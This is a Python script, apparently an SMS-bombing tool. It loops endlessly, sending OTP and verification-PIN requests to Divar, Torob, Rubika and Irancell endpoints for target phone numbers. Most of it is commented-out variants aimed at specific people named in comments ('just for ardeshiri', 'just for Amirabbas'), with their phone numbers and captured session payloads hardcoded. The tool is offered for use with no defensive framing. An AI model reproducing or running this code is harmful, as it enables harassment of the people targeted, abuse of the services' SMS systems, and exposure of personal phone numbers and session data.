import requests

input = input("Enter your number (ex: 9350000000): ")

url = "https://api.divar.ir/v5/auth/authenticate"
payload = {"phone": "0"+input}
response = requests.post(url, json=payload)
print(response.status_code)







# import requests
# from requests import post , get
# from time import sleep
# from os import system , name


# try:
#     data = {
# 	"_csrf_token": "476deda061d648baafe1e3c1ea238f02",
# 	"_sse_token": "f8c81a2a51bf4bbca060b337894b4fc0",
# 	"username": "09921419018",
# 	"action": "check_user_next"
# }
#     url = "https://login.irancell.ir/_nextstep"
#     p = post(url, data=data, timeout=2)
#     sleep(.01)
        
#     rp = p.status_code
#     if rp == 200 :
#         print("[snap] send post and : {}".format(p))   
#     else:
#         print("[-snap] not send , error code:{}".format(p))
# except:
#     print("[-snap] not send check internet or somting..")





# # ## just for ardeshiri :) 

# import os 
# import requests
# from time import sleep

# input = "9352948048"
# # count = input("pleaes enter the count :")
# def rubica(number) : 
#     url = "https://messengerg2c232.iranlms.ir/"
#     payload = {"api_version":"6","tmp_session":"omwdqzynppxjjrxvctevewrfvsrbiqyp","data_enc":"5bjoOBwJGiPzEOeHoAYWknmdTKU0cNHCtjoAscb0XfrHlV5XlZPQeMJWNp3cY/BVXRC2BRgn4YNqo/kIqdmzxOawMGPzQtQNZuyMBEgrMhU6C2yECYRXUddkEm4/u35rc5ENTHVMlFnhwFW0FwtLB6akYdVarOPYPSpWCAEWXzT8Y6jD5tUK3Y277+t2okx1PnSJk/5Ivsi4n3Jb14ldCEQ+Jpe7fdT4SixZIezgYnVWkBMYPJswuG6It0Ogyyfw"}
#     response = requests.post(url, json=payload)
#     print(response.status_code)
    

# def divar(number):
#     url = "https://api.divar.ir/v5/auth/authenticate"
#     respon = {"phone":"0"+number}
#     requs = requests.post(url, json=respon)
#     print(requs.status_code)


# def torob(number):
#     url = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{number}"
#     respon = {}
#     requs = requests.get(url)
#     print(requs.status_code)


# while True: 
#     divar(input)
#     sleep(3) 
#     torob(input)
#     sleep(3)
#     rubica(input)
#     sleep(3)
    








# robika ardeshiri = {"api_version":"6","tmp_session":"omwdqzynppxjjrxvctevewrfvsrbiqyp","data_enc":"5bjoOBwJGiPzEOeHoAYWknmdTKU0cNHCtjoAscb0XfrHlV5XlZPQeMJWNp3cY/BVXRC2BRgn4YNqo/kIqdmzxOawMGPzQtQNZuyMBEgrMhU6C2yECYRXUddkEm4/u35rc5ENTHVMlFnhwFW0FwtLB6akYdVarOPYPSpWCAEWXzT8Y6jD5tUK3Y277+t2okx1PnSJk/5Ivsi4n3Jb14ldCEQ+Jpe7fdT4SixZIezgYnVWkBMYPJswuG6It0Ogyyfw"}
# robika Amirabbas = {"api_version":"6","tmp_session":"omwdqzynppxjjrxvctevewrfvsrbiqyp","data_enc":"5bjoOBwJGiPzEOeHoAYWknmdTKU0cNHCtjoAscb0XfrHlV5XlZPQeMJWNp3cY/BVNICxORL/Zjg1uAlva3mHft77i7KUC93SttRbUjW/kbJO3SDf7IHz9uyMCzMCAhdZ+As1AhL0uyvbVqgUlI4nhVJGZuc0+buZsJH01FRtPoa0Dw8lu1dxlmyBBcJKY+o7s5nVIlG2fHxgDjRaSAEJCXbR82dAh9s7kAWFg2xQ6o+DYX2udXEXPQtTD3Dvo9gc"}







# ## just for Amirabbas :) 

# import os 
# import requests
# from time import sleep

# input = "9921419018"
# # count = input("pleaes enter the count :")
# def rubica(number) : 
#     url = "https://messengerg2c232.iranlms.ir/"
#     payload = {"api_version":"6","tmp_session":"omwdqzynppxjjrxvctevewrfvsrbiqyp","data_enc":"5bjoOBwJGiPzEOeHoAYWknmdTKU0cNHCtjoAscb0XfrHlV5XlZPQeMJWNp3cY/BVNICxORL/Zjg1uAlva3mHft77i7KUC93SttRbUjW/kbJO3SDf7IHz9uyMCzMCAhdZ+As1AhL0uyvbVqgUlI4nhVJGZuc0+buZsJH01FRtPoa0Dw8lu1dxlmyBBcJKY+o7s5nVIlG2fHxgDjRaSAEJCXbR82dAh9s7kAWFg2xQ6o+DYX2udXEXPQtTD3Dvo9gc"}
#     response = requests.post(url, json=payload)
#     print(response.status_code)
    

# def divar(number):
#     url = "https://api.divar.ir/v5/auth/authenticate"
#     respon = {"phone":"0"+number}
#     requs = requests.post(url, json=respon)
#     print(requs.status_code)


# def torob(number):
#     url = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{number}"
#     respon = {}
#     requs = requests.get(url)
#     print(requs.status_code)


# while True: 
#     divar(input)
#     sleep(3) 
#     torob(input)
#     sleep(3)
#     rubica(input)
#     sleep(3)
    

























# ============================================================
# ============================================================
# ============================================================
# ============================================================







# from requests import post , get
# from time import sleep
# from os import system , name


# def snap_market():
#     try:
#         data = {}
#         url = "https://app.snapp.taxi/static/js/5283.949288a2.chunk.js"
#         p = post(url, json=data, timeout=3)
#         rp = p.status_code
#         sleep(.01)
#         if rp == 200:
            
#             print("[snap_market] send post and : {}".format(p))
#         else:
#             print("[-snap_market] not send , error code: {}".format(p))
            
#     except:
#         print("[-snap_market] not send check internet or somting..")
        
# snap_market()




# ============================================================
# ============================================================
# ============================================================
# ============================================================




# import os 
# import requests
# from time import sleep

# input = input("please enter your number : ")
# # count = input("pleaes enter the count :")

# def divar(number):
#     url = "https://api.divar.ir/v5/auth/authenticate"
#     respon = {"phone":"0"+number}
#     requs = requests.post(url, json=respon)
#     print(requs.status_code)

# def torob(number):
#     url = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{number}"
#     respon = {}
#     requs = requests.get(url)
#     print(requs.status_code)

# while True: 
#     divar(input)
#     sleep(3) 
#     torob(input)
#     sleep(3)
    
    
    
# # os.system("clear")